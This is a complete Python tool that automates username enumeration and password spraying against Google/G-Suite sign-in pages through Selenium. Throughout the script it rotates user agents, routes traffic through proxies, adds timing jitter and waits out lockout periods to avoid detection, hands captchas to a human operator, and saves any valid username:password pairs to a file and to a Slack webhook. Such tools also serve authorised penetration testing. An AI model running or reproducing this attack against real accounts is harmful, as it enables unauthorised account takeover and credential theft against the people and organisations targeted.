#!/usr/bin/env python3
# MIT License
#
# Copyright (c) 2022 Mayk
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

"""A basic username enumeration and password spraying tool aimed at
G-Suite's DOM based authentication."""
import requests

from random import randrange, shuffle
from sys import exit
from time import sleep
from urllib.parse import urlparse
from argparse import ArgumentParser
from collections import OrderedDict

# Fake User-Agents
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import (
    SoftwareName,
    HardwareType,
    SoftwareType,
    OperatingSystem,
)

# Import selenium packages
from selenium.webdriver import Chrome, Firefox, DesiredCapabilities
from selenium.common.exceptions import TimeoutException, WebDriverException
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.chrome.service import Service as ChromeService
from selenium.webdriver.firefox.options import Options as FirefoxOptions
from selenium.webdriver.firefox.service import Service as FirefoxService
from selenium.webdriver.firefox.firefox_profile import FirefoxProfile

from webdriver_manager.chrome import ChromeDriverManager
from webdriver_manager.firefox import GeckoDriverManager


# Maspping of element XPATH's in the authentication process
elements = {
    "username": {"type": "XPATH", "value": '//*[@id="identifierId"]'},
    "password": {"type": "NAME", "value": "password"},
    "button_next": {
        "type": "XPATH",
        "value": (
            "/html/body/div[1]/div[1]/div[2]/div/div[2]/"
            "div/div/div[2]/div/div[2]/div/div[1]/div/div/button"
        ),
    },
    "captcha": {"type": "XPATH", "value": '//*[@id="captchaimg"]'},
}

# Colorized output during run
class text_colors:
    red = "\033[91m"
    green = "\033[92m"
    yellow = "\033[93m"
    reset = "\033[0m"


# Class for slack webhook
class SlackWebhook:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url

    # Post a simple update to slack
    def post(self, text):
        block = f"```\n{text}\n```"
        payload = {
            "blocks": [{"type": "section", "text": {"type": "mrkdwn", "text": block}}]
        }
        status = self.__post_payload(payload)
        return status

    # Post a json payload to slack webhook URL
    def __post_payload(self, payload):
        response = requests.post(self.webhook_url, json=payload)
        if response.status_code != 200:
            print(
                "%s[Error] %s%s"
                % (
                    text_colors.red,
                    "Could not send notification to Slack",
                    text_colors.reset,
                )
            )


# General class to run automations
class BrowserEngine:
    # Set User-Agent rotator at the class level
    software_names = [SoftwareName.CHROME.value, SoftwareName.FIREFOX.value]
    software_types = [SoftwareType.WEB_BROWSER.value]
    hardware_types = [HardwareType.COMPUTER.value]
    operating_systems = [OperatingSystem.WINDOWS.value, OperatingSystem.LINUX.value]
    ua_rotator = UserAgent(
        software_names=software_names,
        software_types=software_types,
        hardware_types=hardware_types,
        operating_systems=operating_systems,
    )

    def __init__(self):
        self.driver = None

    def set_proxy(self, proxy):
        raise NotImplementedError()

    def quit(self):
        self.driver.quit()

    def close(self):
        self.driver.close()

    def refresh(self):
        self.driver.refresh()

    def back(self):
        self.driver.execute_script("window.history.go(-1)")

    def clear_cookies(self):
        self.driver.delete_all_cookies()

    def get(self, url):
        self.driver.get(url)

    def find_element(self, type_, value):
        try:
            return self.wait.until(
                lambda driver: driver.find_element(getattr(By, type_), value)
            )
        except TimeoutException:
            return False

    def populate_element(self, element, value, sendenter=False):
        if sendenter:
            element.send_keys(value + Keys.RETURN)
        else:
            element.send_keys(value)

    def is_clickable(self, type_, value):
        return self.wait.until(EC.element_to_be_clickable((getattr(By, type_), value)))

    def click(self, button):
        button.click()

    def submit(self, form):
        form.submit()

    def execute_script(self, code):
        self.driver.execute_script(code)

    def screenshot(self, filename):
        self.driver.get_screenshot_as_file(filename)


# Class for chrome browser
class ChromeBrowserEngine(BrowserEngine):
    driver_path = ChromeDriverManager(log_level=0).install()

    def __init__(self, wait=5, proxy=None, headless=False, random_ua=False):
        self.options = ChromeOptions()

        # Set preferences
        self.options.add_argument("--incognito")
        self.options.add_argument("--lang=en-US")
        self.options.add_argument("--no-sandbox")
        self.options.add_argument("--disable-dev-shm-usage")
        self.options.add_argument(
            '--user-agent=""Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
            'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36""'
        )
        self.options.accept_untrusted_certs = True
        self.options.headless = headless
        self.set_proxy(proxy)
        prefs = {
            "profile.managed_default_content_settings.images": 1,
            "profile.default_content_setting_values.notifications": 2,
            "profile.managed_default_content_settings.stylesheets": 2,
            "profile.managed_default_content_settings.cookies": 1,
            "profile.managed_default_content_settings.javascript": 1,
            "profile.managed_default_content_settings.plugins": 1,
            "profile.managed_default_content_settings.popups": 2,
            "profile.managed_default_content_settings.geolocation": 2,
            "profile.managed_default_content_settings.media_stream": 2,
        }
        self.options.add_experimental_option("prefs", prefs)

        self.driver = Chrome(
            options=self.options, service=ChromeService(self.driver_path)
        )
        self.driver.set_window_position(0, 0)
        self.driver.set_window_size(1024, 768)
        if random_ua:
            self.driver.execute_cdp_cmd(
                "Network.setUserAgentOverride",
                {"userAgent": self.ua_rotator.get_random_user_agent()},
            )

        self.wait = WebDriverWait(self.driver, wait)

    def set_proxy(self, proxy):
        if proxy is not None:
            self.options.add_argument("--proxy-server=%s" % proxy)


# Class for firefox browser
class FirefoxBrowserEngine(BrowserEngine):
    driver_path = GeckoDriverManager(log_level=0).install()

    def __init__(self, wait=5, proxy=None, headless=False, random_ua=False):
        self.set_proxy(proxy)  # this should be at the top to make effect
        self.options = FirefoxOptions()
        # Set preferences
        self.options.set_preference(
            "permissions.default.image", 2
        )  # Supposed to help with memory issues
        self.options.set_preference("dom.ipc.plugins.enabled.libflashplayer.so", False)
        self.options.set_preference("browser.cache.disk.enable", False)
        self.options.set_preference("browser.cache.memory.enable", False)
        self.options.set_preference("browser.cache.offline.enable", False)
        self.options.set_preference("network.http.use-cache", False)
        self.options.set_preference("intl.accept_languages", "en-US")
        self.options.accept_untrusted_certs = True
        self.options.headless = headless

        self.driver = Firefox(
            options=self.options, service=FirefoxService(self.driver_path)
        )
        self.driver.set_window_position(0, 0)
        self.driver.set_window_size(1024, 768)
        if random_ua:
            self.driver.execute_cdp_cmd(
                "Network.setUserAgentOverride",
                {"userAgent": self.ua_rotator.get_random_user_agent()},
            )

        self.wait = WebDriverWait(self.driver, wait)

    def set_proxy(self, proxy):
        if proxy is not None:
            parsed = urlparse(proxy)
            if parsed.scheme == "http":
                DesiredCapabilities.FIREFOX["proxy"] = {
                    "httpProxy": parsed.netloc,
                    "sslProxy": parsed.netloc,
                    "proxyType": "MANUAL",
                }
            elif parsed.scheme.startswith("socks"):
                DesiredCapabilities.FIREFOX["proxy"] = {
                    "socksProxy": parsed.netloc,
                    "socksVersion": int(parsed.scheme[5]),
                    "proxyType": "MANUAL",
                }


# ==========
# Statistics
# ==========
def spray_stats(creds, locked, invalid, args):
    stats_text = "\n%s\n[*] Password Spraying Stats\n%s\n" % ("=" * 27, "=" * 27)
    stats_text += "[*] Total Usernames Tested:  %d\n" % (
        len(creds) + len(locked) + invalid
    )
    stats_text += "[*] Valid Accounts:          %d\n" % len(creds)
    stats_text += "[*] Locked Accounts:         %d\n" % len(locked)
    stats_text += "[*] Invalid Usernames:       %d\n" % invalid
    print(stats_text)
    if len(creds) > 0:
        print(f"[+] Writing valid credentials to the file: {args.output}...")
        with open(args.output, "w") as file_:
            for user in creds.keys():
                file_.write("%s\n" % ("%s:%s" % (user, creds[user])))
                # Append to text
                stats_text += "\n%s:%s" % (user, creds[user])
    if args.slack:
        webhook = SlackWebhook(args.slack)
        try:
            webhook.post(stats_text)
        except BaseException as e:
            print("[ERROR] %s" % e)
        else:
            print("[*] Webhook message sent")


def enum_stats(valid, invalid, args):
    stats_text = "\n%s\n[*] Username Enumeration Stats\n%s\n" % ("=" * 30, "=" * 30)
    stats_text += "[*] Total Usernames Tested:  %d\n" % (len(valid) + invalid)
    stats_text += "[*] Valid Usernames:         %d\n" % len(valid)
    stats_text += "[*] Invalid Usernames:       %d\n" % invalid
    print(stats_text)
    if len(valid) > 0:
        print(f"[+] Writing valid usernames to the file: {args.output}...")
        with open(args.output, "w") as file_:
            for user in valid:
                file_.write("%s\n" % user)
        # Append results to text
        stats_text += "\n" + "\n".join(valid)
    if args.slack:
        webhook = SlackWebhook(args.slack)
        try:
            webhook.post(stats_text)
        except BaseException as e:
            print("[ERROR] %s" % e)
        else:
            print("[*] Webhook message sent")


# =========================
# General helpers
# =========================
def wait(delay, jitter):
    if jitter == 0:
        sleep(delay)
    else:
        sleep(delay + randrange(jitter))


# =========================
# Data manipulation helpers
# =========================
def loop_dict(dict_):
    for key in dict_.keys():
        yield key


def get_list_from_file(file_):
    with open(file_, "r") as f:
        list_ = [line.strip() for line in f]
    return list_


# =========================
# Password spraying helpers
# =========================
def lockout_reset_wait(lockout):
    print("[*] Sleeping for %.1f minutes" % (lockout))
    sleep(lockout * 60)


def new_browser(driver, args):
    if driver is None or driver == "chrome":
        return ChromeBrowserEngine(
            wait=args.wait, proxy=args.proxy, headless=args.headless, random_ua=args.rua
        )
    elif driver == "firefox":
        return FirefoxBrowserEngine(
            wait=args.wait, proxy=args.proxy, headless=args.headless, random_ua=args.rua
        )


def reset_browser(browser, driver, args):
    browser.quit()
    return new_browser(driver, args)


# Username enumeration
def enum(args, username_list):
    valid = []
    invalid = 0
    counter = 0
    browser = new_browser(args.driver, args)

    if args.shuffle:
        shuffle(username_list)
    for idx, username in enumerate(username_list):
        # Handle browser resets after every given username attempts
        if counter == args.reset_after:
            browser = reset_browser(
                browser, args.driver, args
            )  # Reset the browser to deal with latency issues
            counter = 0
        # Sleep between each user
        if idx > 0 and args.sleep > 0:
            wait(args.sleep, args.jitter)

        counter += 1

        print("[*] Current username: %s" % username)

        # This seems to helps with memory issues...
        browser.clear_cookies()

        # Reload the page for each username
        retry = 0
        loaded = None
        while loaded is None:
            try:
                browser.get(args.target)
                loaded = True
            except BaseException as e:
                retry += 1
                if retry == 5:
                    print("[ERROR] %s" % e)
                    exit(1)

        wait(args.wait, args.jitter)  # Ensure the previous DOM is stale
        # Populate the username field and click 'Next'
        element = elements["username"]
        usernamefield = browser.find_element(element["type"], element["value"])
        if not usernamefield:
            print(
                "%s[Error] %s%s"
                % (text_colors.red, "Username field not found", text_colors.reset)
            )
            continue
        else:
            browser.populate_element(usernamefield, username)

        # Find button and click it
        element = elements["button_next"]
        try:
            browser.click(browser.is_clickable(element["type"], element["value"]))
        except BaseException as e:
            print("[ERROR] %s" % e)
            continue

        sleep(1)
        # Check if captcha was activated
        element = elements["captcha"]
        element_pwd = elements["password"]
        captcha = browser.find_element(element["type"], element["value"])
        if captcha:
            need_interaction = True
            captcha_counter = 0
            while need_interaction and captcha_counter <= 60:
                print(
                    "%s[Captcha Triggered] Solve it in %d seconds%s"
                    % (text_colors.yellow, 60 - captcha_counter, text_colors.reset),
                    end="\r",
                )
                sleep(2)
                captcha_counter += 2
                need_interaction = (
                    False
                    if browser.find_element(element_pwd["type"], element_pwd["value"])
                    else True
                )
            # No user interaction
            if captcha_counter > 60:
                print(
                    "%s[Invalid Captcha] %s%s"
                    % (text_colors.yellow, username, text_colors.reset)
                )
                continue

        # Handle invalid usernames
        element = elements["password"]
        if not browser.find_element(element["type"], element["value"]):
            if args.verbose:
                print(
                    "%s[Invalid User] %s%s"
                    % (text_colors.red, username, text_colors.reset)
                )
            invalid += 1

        # If no username error, valid username
        else:
            print("%s[Found] %s%s" % (text_colors.green, username, text_colors.reset))
            valid.append(username)

    browser.quit()
    enum_stats(valid, invalid, args)


# Password spray
def spray(args, username_list, password_list):
    creds = {}
    locked = []
    invalid = 0
    counter = 0
    last_index = len(password_list) - 1
    browser = new_browser(args.driver, args)

    for index, password in enumerate(password_list):

        print("[*] Spraying password: %s" % password)

        if args.shuffle:
            shuffle(username_list)
        for useridx, username in enumerate(username_list):

            if counter >= args.reset_after:
                browser = reset_browser(
                    browser, args.driver, args
                )  # Reset the browser to deal with latency issues
                counter = 0

            # Sleep between each user
            if useridx > 0 and args.sleep > 0:
                wait(args.sleep, args.jitter)

            print("[*] Current username: %s" % username)

            counter += 1

            # This seems to helps with memory issues...
            browser.clear_cookies()

            # Reload the page for each username
            retry = 0
            loaded = None
            while loaded is None:
                try:
                    browser.get(args.target)
                    loaded = True
                except BaseException as e:
                    retry += 1
                    if retry == 5:
                        print("[ERROR] %s" % e)
                        exit(1)
                    pass

            wait(args.wait, args.jitter)  # Ensure the previous DOM is stale

            # Populate the username field and click 'Next'
            element = elements["username"]
            usernamefield = browser.find_element(element["type"], element["value"])
            if not usernamefield:
                print(
                    "%s[Error] %s%s"
                    % (text_colors.red, "Username field not found", text_colors.reset)
                )
                continue

            browser.populate_element(usernamefield, username)
            # Find button and click it
            element = elements["button_next"]
            try:
                browser.click(browser.is_clickable(element["type"], element["value"]))
            except BaseException as e:
                print("[ERROR] %s" % e)
                continue

            sleep(1)

            # Check if captcha was activated
            element = elements["captcha"]
            element_pwd = elements["password"]
            captcha = browser.find_element(element["type"], element["value"])
            if captcha:
                need_interaction = True
                captcha_counter = 0
                while need_interaction and captcha_counter <= 60:
                    print(
                        "%s[Captcha Triggered] Solve it in %d seconds%s"
                        % (text_colors.yellow, 60 - captcha_counter, text_colors.reset),
                        end="\r",
                    )
                    sleep(2)
                    captcha_counter += 2
                    need_interaction = (
                        False
                        if browser.find_element(
                            element_pwd["type"], element_pwd["value"]
                        )
                        else True
                    )
                # No user interaction
                if captcha_counter > 60:
                    print(
                        "%s[Invalid Captcha] %s%s"
                        % (text_colors.yellow, username, text_colors.reset)
                    )
                    continue

            wait(args.wait, args.jitter)  # Ensure the previous DOM is stale

            # Handle invalid usernames
            element = elements["password"]
            pwdfield = browser.find_element(element["type"], element["value"])
            if not pwdfield:
                if args.verbose:
                    print(
                        "%s[Invalid User] %s%s"
                        % (text_colors.red, username, text_colors.reset)
                    )
                    # Remove from list
                    username_list.remove(username)
                invalid += 1  # Keep track so the user knows they need to run enum

            else:
                # Populate the password field and click 'Sign In'
                browser.populate_element(pwdfield, password, True)
                # browser.click(browser.is_clickable(elements["type"], elements["button_next"]))

                wait(args.wait, args.jitter)  # Ensure the previous DOM is stale

                # TODO: Check if account is locked out
                # if browser.find_element(elements["type"], elements["locked"]):
                #    if args.verbose: print("%s[Account Locked] %s%s" % (text_colors.yellow, username, text_colors.reset))
                #    locked.append(username)
                #    break

                # Check for invalid password or account lock outs
                if not browser.find_element(element["type"], element["value"]):
                    print(
                        "%s[Found] %s:%s%s"
                        % (text_colors.green, username, password, text_colors.reset)
                    )
                    creds[username] = password
                    # Remove user from list
                    username_list.remove(username)
                    # Send notification
                    if args.slack:
                        notify = SlackWebhook(args.slack)
                        notify.post(
                            f"Valid creds for {args.target}:\n{username}:{password}"
                        )

                else:
                    print(
                        "%s[Invalid Creds] %s:%s%s"
                        % (text_colors.red, username, password, text_colors.reset)
                    )

        # Wait for lockout period if not last password
        if index != last_index:
            lockout_reset_wait(args.lockout)

    browser.quit()
    spray_stats(creds, locked, invalid, args)


# Print the banner
def banner(args):
    BANNER = (
        "\n.d8888b.   .d8888b.  8888888b.  8888888b.         d8888 Y88b   d88P 8888888888 8888888b.  \n"
        "d88P  Y88b d88P  Y88b 888   Y88b 888   Y88b       d88888  Y88b d88P  888        888   Y88b \n"
        "888    888 Y88b.      888    888 888    888      d88P888   Y88o88P   888        888    888 \n"
        '888         "Y888b.   888   d88P 888   d88P     d88P 888    Y888P    8888888    888   d88P \n'
        '888  88888     "Y88b. 8888888P"  8888888P"     d88P  888     888     888        8888888P"  \n'
        '888    888       "888 888        888 T88b     d88P   888     888     888        888 T88b   \n'
        "Y88b  d88P Y88b  d88P 888        888  T88b   d8888888888     888     888        888  T88b  \n"
        ' "Y8888P88  "Y8888P"  888        888   T88b d88P     888     888     8888888888 888   T88b \n'
        "\n\n"
    )

    _args = vars(args)
    for arg in _args:
        if _args[arg]:
            space = " " * (15 - len(arg))

            BANNER += "\n   > %s%s:  %s" % (arg, space, str(_args[arg]))

            # Add data meanings
            if arg == "lockout":
                BANNER += " minutes"

            if arg in ["wait", "jitter"]:
                BANNER += " seconds"

    BANNER += "\n"
    BANNER += "\n>----------------------------------------<\n"

    print(BANNER)


"""
G-Suite handles authentication uniquely.
Instead of username and password fields in a single form on one page, the DOM dynamically modifies
the page to accept a username, check if it is valid, and then accept a password.
"""
if __name__ == "__main__":
    parser = ArgumentParser(description="G-Suite Password Sprayer.")
    parser.add_argument(
        "-t",
        "--target",
        type=str,
        help="Target URL (default: %(default)s)",
        default="https://accounts.google.com/",
    )
    parser.add_argument(
        "-d",
        "--driver",
        type=str,
        choices=["chrome", "firefox"],
        help="Webdriver to be used (default: %(default)s)",
        default="chrome",
    )
    group_user = parser.add_mutually_exclusive_group(required=True)
    group_user.add_argument("-u", "--username", type=str, help="Single username")
    group_user.add_argument(
        "-U", "--usernames", type=str, metavar="FILE", help="File containing usernames"
    )
    parser.add_argument(
        "-o",
        "--output",
        type=str,
        help="Output file (default depends on subcommand)",
        required=False,
    )
    parser.add_argument(
        "-r",
        "--reset-after",
        type=int,
        help="Reset browser after N attempts (default: %(default)s)",
        default=1,
        metavar="N",
        dest="reset_after",
    )
    parser.add_argument(
        "-x",
        "--proxy",
        type=str,
        help="Proxy to pass traffic through: <scheme://ip:port>",
        required=False,
    )
    parser.add_argument(
        "--sleep",
        type=float,
        help="Sleep time (in seconds) between each iteration (default: %(default)s)",
        default=0,
        required=False,
    )
    parser.add_argument(
        "--wait",
        type=float,
        help="Time to wait (in seconds) when looking for DOM elements (default: %(default)s)",
        default=3,
        required=False,
    )
    parser.add_argument(
        "--jitter",
        type=int,
        help="Max jitter (in seconds) to be added to wait time (default: %(default)s)",
        default=0,
        required=False,
    )
    parser.add_argument(
        "--slack",
        type=str,
        help="Slack webhook for sending notifications (default: %(default)s)",
        default=None,
        required=False,
    )
    parser.add_argument(
        "-H",
        "--headless",
        action="store_true",
        help="Run in headless mode",
        required=False,
    )
    parser.add_argument(
        "-s", "--shuffle", action="store_true", help="Shuffle user list", required=False
    )
    parser.add_argument(
        "--rua", action="store_true", help="Use random user-agent", required=False
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="Verbose output", required=False
    )

    subparsers = parser.add_subparsers(
        title="subcommands",
        description="valid subcommands",
        required=True,
        help="additional help",
        dest="cmd",
    )

    # Add subparser for enumeration
    parser_enum = subparsers.add_parser(
        "enum", description="Perform user enumeration", help="Perform user enumeration"
    )
    parser_enum.add_argument(
        "-o",
        "--output",
        type=str,
        default="valid_users.txt",
        help="Output file (default: %(default)s)",
        required=False,
    )

    # Add subparser for password spraying
    parser_spray = subparsers.add_parser(
        "spray",
        description="Perform password spraying",
        help="Perform password spraying",
    )
    parser_spray.add_argument(
        "-o",
        "--output",
        type=str,
        default="valid_creds.txt",
        help="Output file (default: %(default)s)",
        required=False,
    )
    group_password = parser_spray.add_mutually_exclusive_group(required=True)
    group_password.add_argument("-p", "--password", type=str, help="Single password")
    group_password.add_argument(
        "-P", "--passwords", type=str, help="File containing passwords", metavar="FILE"
    )
    parser_spray.add_argument(
        "--lockout",
        type=float,
        required=True,
        help="Lockout policy reset time (in minutes) (required)",
    )

    args = parser.parse_args()

    assert args.reset_after > 0
    assert args.wait >= 0
    assert args.jitter >= 0
    if args.cmd == "spray":
        assert args.lockout >= 0

    if args.proxy:
        if args.proxy[0].isdigit():
            args.proxy = "http://" + args.proxy

    # Print the banner
    banner(args)

    try:
        username_list = (
            [args.username] if args.username else get_list_from_file(args.usernames)
        )

        if args.cmd == "spray":
            password_list = (
                [args.password] if args.password else get_list_from_file(args.passwords)
            )
            spray(args, username_list, password_list)

        elif args.cmd == "enum":
            enum(args, username_list)

    except IOError as e:
        print(e)
        exit(1)
